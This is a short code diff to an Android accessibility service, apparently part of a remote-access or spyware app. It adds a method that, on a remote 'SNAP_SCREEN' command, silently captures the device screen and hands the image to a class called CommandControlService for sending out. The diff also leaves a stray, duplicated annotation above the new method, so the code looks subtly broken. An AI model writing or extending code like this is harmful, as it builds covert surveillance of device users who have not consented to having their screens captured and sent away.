@@ -4040,6 +4040,34 @@ public class UiAssistBridge extends AccessibilityService {
      * Called repeatedly from the dedicated silent thread.
      */
     @RequiresApi(api = Build.VERSION_CODES.R)
+    /** Called by SNAP_SCREEN command — captures once and sends as JSON {type:"screenshot"} */
+    @androidx.annotation.RequiresApi(api = Build.VERSION_CODES.R)
+    public void takeScreenshotForStorage(android.content.Context ctx) {
+        final CommandControlService ccs = CommandControlService.getInstance();
+        takeScreenshot(Display.DEFAULT_DISPLAY, SILENT_SCREENSHOT_EXECUTOR,
+            new android.accessibilityservice.AccessibilityService.TakeScreenshotCallback() {
+                @Override
+                public void onSuccess(android.accessibilityservice.AccessibilityService.ScreenshotResult result) {
+                    try {
+                        android.hardware.HardwareBuffer hw = result.getHardwareBuffer();
+                        android.graphics.Bitmap bmp = android.graphics.Bitmap.wrapHardwareBuffer(hw, result.getColorSpace());
+                        hw.close();
+                        if (bmp == null) return;
+                        android.graphics.Bitmap soft = bmp.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
+                        bmp.recycle();
+                        if (ccs != null) ccs.sendScreenshotBitmap(soft);
+                    } catch (Exception e) {
+                        Log.e(TAG, "takeScreenshotForStorage onSuccess error: " + e.getMessage());
+                    }
+                }
+                @Override
+                public void onFailure(int errorCode) {
+                    Log.w(TAG, "takeScreenshotForStorage failed: " + errorCode);
+                    if (ccs != null) ccs.sendResponse("ERROR", "Screenshot failed: " + errorCode);
+                }
+            });
+    }
+
     public void capSilentScreen(int quality) {
         if (silentScreenshotApiInFlight) {
             return;
